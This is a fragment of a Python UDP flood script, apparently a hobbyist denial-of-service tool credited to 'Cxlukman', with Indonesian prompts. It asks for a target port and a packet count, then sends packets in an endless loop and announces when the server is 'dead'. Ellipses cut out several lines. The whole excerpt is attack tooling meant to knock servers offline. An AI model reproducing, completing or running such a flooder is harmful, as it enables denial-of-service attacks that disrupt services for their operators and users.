...
os.system("clear")
print("\033[1;32;40m ==> Code by Cxlukman <==  \n")
...
port = int(input(" PORT:"))
choice = str(input(" GAS BUBARIN SERVER?(y/n):"))
times = int(input(" PAKET NYA BOS:"))
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PACKETS FROM LUKMAN X AFIT!!!")
		except:
			s.close()
			print("[!] SERVER MATI BOS!!!")
